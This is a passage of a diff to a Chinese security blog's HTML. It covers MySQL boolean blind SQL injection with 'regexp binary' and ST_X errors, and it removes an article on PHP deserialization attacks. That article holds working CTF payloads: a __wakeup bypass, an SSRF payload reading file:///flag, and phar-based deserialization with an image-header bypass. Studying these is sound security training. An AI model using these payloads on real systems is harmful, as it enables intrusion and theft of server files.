class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39; &#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;a&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;a&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;A&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;A&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39;A&#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39;A&#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        0 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39;a&#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39;a&#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="无判断字符mysql查询"><a href="#无判断字符mysql查询" class="headerlink" title="无判断字符mysql查询"></a>无判断字符mysql查询</h2><p>由此可知，我们可以利用regexp binary在不使用&gt;,&lt;,=,like的情况下，进行bool盲注。与前面没有被过滤的if语句结合起来，可以得到</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if((select flag from flag)regexp binary &#39;flag is here&#39;,2,3);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| if((select flag from flag)regexp binary &#39;flag is here&#39;,2,3) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           2 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt;  select if((select flag from flag)regexp binary &#39;flag is &#39;,2,3);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| if((select flag from flag)regexp binary &#39;flag is &#39;,2,3) |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">|                                                       2 |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
@@ -264,7 +448,7 @@
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ST_X 以 ST_Point 作为输入参数，返回其 x 坐标。在 SQLite 中，ST_X 也可以更新 ST_Point 的 x 坐标。</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line">st_x (point1 geometryblob)</span><br><span class="line">st_x (input_point geometryblob, new_Xvalue double)</span><br><span class="line">ST_X 函数可用于 SQLite 更新点的 x 坐标。在这种情况下，将返回 geometryblob。</span><br></pre></td></tr></table></figure>
 
-<p>ST_X是返回一个坐标的x坐标，所有需要用Point函数来传入坐标，ST_GemoFromText函数的作用是将返回的坐标变成字符串。当POINT传入的不是一个坐标时，语句也可以执行，只有当需要返回这个x坐标时才会报错。</p>
+<p>ST_X是返回一个坐标的x坐标，所以需要用Point函数来传入坐标，ST_GemoFromText函数的作用是将返回的坐标变成字符串。当POINT传入的不是一个坐标时，语句也可以执行，只有当需要返回这个x坐标时才会报错。</p>
 <p>我们可以通过返回的页面来判断bool盲注有没有成功，返回0或任何数字会出现cat.png，mysql查询语句报错会出现空白页面（状态码为500的错误）</p>
 <p>然后发现只要传入ST_X(数字)可以达到一样的效果。也就是SELECT IF({}, ST_X(MADS), 0);只要传入的参数不正确，就可以达到我们想要的效果。</p>
 <p>这里的ST_X等函数在低版本中运行不了</p>
@@ -1723,202 +1907,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/09/xiuleihua/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="zoey">
-      <meta itemprop="description" content="Hello!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zoey">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/09/xiuleihua/" class="post-title-link" itemprop="url">反序列化漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-09 17:58:04" itemprop="dateCreated datePublished" datetime="2020-10-09T17:58:04+08:00">2020-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-15 15:13:05" itemprop="dateModified" datetime="2020-11-15T15:13:05+08:00">2020-11-15</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>把对象转换为字节序列的过程称为对象的序列化</strong>；<strong>把字节序列恢复为对象的过程称为对象的反序列化</strong>。</p>
-<p>对象的序列化主要有两种用途：</p>
-<p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</p>
-<p>2） 在网络上传送对象的字节序列。</p>
-<p>序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
-<p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode</p>
-<h4 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h4><p>unserialize函数，json_decode函数变量可控，php文件中存在可利用的类，类中有魔术方法</p>
-<p>php将所有以 __ (两个下划线) 开头的类方法保留为魔术方法</p>
-<p><strong>常用的魔术方法</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct()  当一个对象创建时自动调用</span><br><span class="line">__wakeup()     使用unserialse()函数时会自动调用</span><br><span class="line">__destruct()   当对象被销毁时自动调用（php绝大多数情况下会自动调用销毁对象）</span><br><span class="line">__sleep()      使用serialize()函数是触发</span><br><span class="line">__toString()  把类当作字符串使用时触发，返回值需要为字符串</span><br><span class="line">    (例如一个类A,实例化之后为$a,<span class="keyword">echo</span> $a, 或者$a与字符串对比，这时就会触发该函数)</span><br></pre></td></tr></table></figure>
-
-<h4 id="不同属性序列化"><a href="#不同属性序列化" class="headerlink" title="不同属性序列化"></a>不同属性序列化</h4><p>Public属性序列化后格式:成员名</p>
-<p>Private属性序列化后格式:%00类名%00成员名</p>
-<p>Protected属性序列化后的格式:%00*%00成员名</p>
-<p>new类名()：调用这个类的构造函数初始化对象，类名（）这个是构造函数，用来初始化。</p>
-<p>在进行类的序列化时 私有属性 会加空白字符类名空白字符；保护属性会加 * （注意空白字符不是空格，空格的16进制为20，空白字符的16进制为00）</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDHDJCPDCCOHAGOGH"></p>
-<h4 id="在类外定义类中的值"><a href="#在类外定义类中的值" class="headerlink" title="在类外定义类中的值"></a>在类外定义类中的值</h4><p><strong>重新定义类中属性的值</strong></p>
-<p>通过new 类名 （”对类中的变量重新定义“）</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDBCPDDCOHAGOGH"></p>
-<p><strong>在类的外面定义类中的函数并调用方法</strong></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDACPDFCOHAGOGH"></p>
-<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 使用unserialse（）函数时会自动调用</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行</span><br><span class="line"></span><br><span class="line">CVE-2016-7124(绕过__wakeup)</span><br><span class="line">漏洞影响版本：</span><br><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure>
-
-<h3 id="OC绕过"><a href="#OC绕过" class="headerlink" title="OC绕过"></a>OC绕过</h3><p>OC绕过是通过修改O：数字（C：数字）来绕过正则匹配</p>
-<p>例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/&#x27;</span>,$var))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//若传入的参数有匹配了这个正则，则输入错误。</span></span><br><span class="line">我们可以使用+号当做空格绕过，即O:+<span class="number">4</span>即可绕过。</span><br></pre></td></tr></table></figure>
-
-<h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p>私有属性产生的一些不可见字符如果被过滤掉，可以用字符编码来替换这些字符进行绕过。</p>
-<p>例：当反序列化中的属性是private时，在url输入payload时空字符不能被识别，会导致反序列化失败，我们可以在把空字符转换为16进制绕过。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\00就是16进制的chr（0）</span><br><span class="line">%00是chr(0)的url编码</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDGCPDEDDDHCOHAGOGH"></p>
-<p>可以看出，当属性为private时，例：private $address = ‘shanxi’,反序列化的时候应为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\00test\00address</span><br></pre></td></tr></table></figure>
-
-<p>当属性为protected时，例：protected $age = ‘21’,反序列化的时候应该为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\00*\00age</span><br></pre></td></tr></table></figure>
-
-<p>当代码过滤一些字符的时候<code>例如：flag</code>，我们可以通过16进制编码把flag编写为16进制，这时我们可以把表示字符串的字符s改为大写，这样它在反序列化的时候就能识别16进制，既可以绕过过滤，又可以成功执行反序列化。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDCCPDEDDDICOHAGOGH"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDDCPDEDDDJCOHAGOGH"></p>
-<p>可以看到，当s为大写时，可以成功识别16进制。</p>
-<h4 id="unserialize4"><a href="#unserialize4" class="headerlink" title="unserialize4"></a>unserialize4</h4><p>cURL会话</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">初始化一个新的cURL会话并获取一个网页</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">&quot;http://www.runoob.com/&quot;</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//创建cURL就可以使用一些协议读取和执行相关命令</span></span><br><span class="line">   <span class="comment">// http://www.xxx.com/ssrf.php?url=file:///flag</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $b = strpos(<span class="keyword">$this</span>-&gt;a, <span class="string">&#x27;flag&#x27;</span>);<span class="comment">//strpos()函数查找字符串在另一字符串中第一次出现的位置。如果                                         flag在a中出现过，则$b为真</span></span><br><span class="line">        <span class="keyword">if</span>($b) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();<span class="comment">//初始化一个cURL会话</span></span><br><span class="line">        </span><br><span class="line">        curl_setopt($c, CURLOPT_URL, <span class="keyword">$this</span>-&gt;a);<span class="comment">//设定请求的url</span></span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//	启用时会将头文件的信息作为数据流输出。 参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line">        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> curl_exec($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;z&quot;</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&quot;z&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//由于一次GET传输会先进行URL解码，这里对字母a进行双url编码</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDECPDEDFDCCOHAGOGH"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">O:5:&quot;Hello&quot;:1:&#123;S:4:&quot;%00*%00a&quot;;S:14:&quot;file:&#x2F;&#x2F;&#x2F;fl%25%36%31g&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><p>反序列化字符串都是以一<code>&quot;;&#125;</code>结束的，所以如果我们把<code>&quot;;&#125;</code>带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。</p>
-<p>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符,我们可以根据需求指定s的长度。</p>
-<p>例：字符逃逸将age从13变成35。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDFCPDEDCDACOHAGOGH"></p>
-<h3 id="PHar反序列化"><a href="#PHar反序列化" class="headerlink" title="PHar反序列化"></a>PHar反序列化</h3><p>Phar反序列化可以在不使用php函数unserialize（）的前提下，进行php反序列化漏洞。</p>
-<p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br>例如常见的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&#39;);</span><br><span class="line">include(&#39;data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxxxxxxxxx&#39;);</span><br></pre></td></tr></table></figure>
-
-<p><code>phar://</code>也是流包装的一种</p>
-<h4 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h4><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
-<p>phar文件类似zip和jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况下去访问这个包里面的php，并执行。</p>
-<h4 id="phar文件标识"><a href="#phar文件标识" class="headerlink" title="phar文件标识"></a>phar文件标识</h4><p><strong>1，a stub</strong></p>
-<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
-<p><strong>2，manifest</strong></p>
-<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
-<p><strong>3，contents</strong></p>
-<p>被压缩文件的内容。</p>
-<p><strong>4，signature</strong></p>
-<p>签名，发在文件末尾。</p>
-<h4 id="构建phar文件"><a href="#构建phar文件" class="headerlink" title="构建phar文件"></a>构建phar文件</h4><p><strong>将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。不同的php.ini文件对应着phpstudy的不同版本。</strong></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDHCPDEDCDBCOHAGOGH"></p>
-<p><strong>执行下面的文本生成phar文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar，文件名可自己设置，例·：test.php</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;<span class="comment">//类中有一个属性data,属性值为hu3sky</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//该文本的文件名为phar.php</span></span><br></pre></td></tr></table></figure>
-
-<p>修改php-5.5.38文件，可以看到成功执行，生成phar文件。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDACPDEDCDICOHAGOGH"></p>
-<h4 id="打开phar文件"><a href="#打开phar文件" class="headerlink" title="打开phar文件"></a>打开phar文件</h4><p>可以看到该phar文件由四部分组成，文件标识（__HALT_COMPILER()）</p>
-<p>manifest（反序列化内容） ，压缩文件内容，签名。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDICPDEDDDFCOHAGOGH"></p>
-<h4 id="利用phar文件"><a href="#利用phar文件" class="headerlink" title="利用phar文件"></a>利用phar文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当用phar:&#x2F;&#x2F;访问phar文件时，会触发反序列化，会触发魔法函数。</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDIDJCPDEDEDJCOGKHAGH"></p>
-<p>当在setStub添加图片文件头，可以绕过图片头检测。</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/431.png"></p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>只要phar://协议解析文件的时候，就会造成序列化的问题，所以文件操作的函数都可以触发这种序列化：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fileatime / filectime / filemtime</span><br><span class="line">stat / fileinode / fileowner / filegroup / fileperms</span><br><span class="line">file / file_get_contents / readfile / `fopen``</span><br><span class="line">file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span><br><span class="line">parse_ini_file</span><br><span class="line">unlink</span><br><span class="line">copy</span><br><span class="line"><span class="keyword">include</span></span><br><span class="line">扩展</span><br><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br></pre></td></tr></table></figure>
-
-<p>绕过图片头检测</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;&#125;</span><br><span class="line">$jpeg_header_size = </span><br><span class="line"><span class="string">&quot;图片&quot;</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;setStub($jpeg_header_size.<span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><h4 id="sseion的简单介绍"><a href="#sseion的简单介绍" class="headerlink" title="sseion的简单介绍"></a>sseion的简单介绍</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDECPDEDEDFCOHAGOGH"></p>
-<p><strong>PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。</strong></p>
-<p>Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。</p>
-<p><strong>开启session</strong></p>
-<p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
-<p><strong>注释：</strong>session_start() 函数必须位于 <html> 标签之前：</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDCCPDEDEDDCOHAGOGH"></p>
-<p><strong>终结session</strong></p>
-<p><img src="F:\信安\sql\444.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDFCPDEDEDGCOHAGOGH"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDHCPDEDEDHCOHAGOGH"></p>
-<h4 id="开启session并执行文件"><a href="#开启session并执行文件" class="headerlink" title="开启session并执行文件"></a>开启session并执行文件</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDGCPDEDEDICOHAGOGH"></p>
-<p><strong>删除文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2017/12/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">session_start();<span class="comment">// 打开session</span></span><br><span class="line">$_SESSION[<span class="string">&quot;demo1&quot;</span>] = <span class="string">&quot;default_1&quot;</span>;</span><br><span 